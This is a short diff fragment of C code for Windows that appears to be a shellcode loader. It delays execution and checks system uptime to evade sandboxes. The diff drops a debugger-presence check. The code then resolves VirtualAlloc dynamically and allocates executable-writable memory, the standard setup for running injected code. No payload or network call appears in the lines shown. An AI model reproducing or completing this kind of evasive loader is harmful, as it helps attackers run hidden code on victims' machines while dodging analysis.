@@ -61,7 +61,7 @@ int main(){
          HANDLE thandle=NULL;
          CONTEXT ctx;
          Sleep(5000);
-        if (tickCount > 60000 && !IsDebuggerPresent()) {
+        if (tickCount > 60000) {
             int j= 0;
             vaex alloc =(vaex)GetProcAddress(hKernel32,"VirtualAlloc");
             LPVOID alloc_mem = alloc(NULL, totalBytes, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
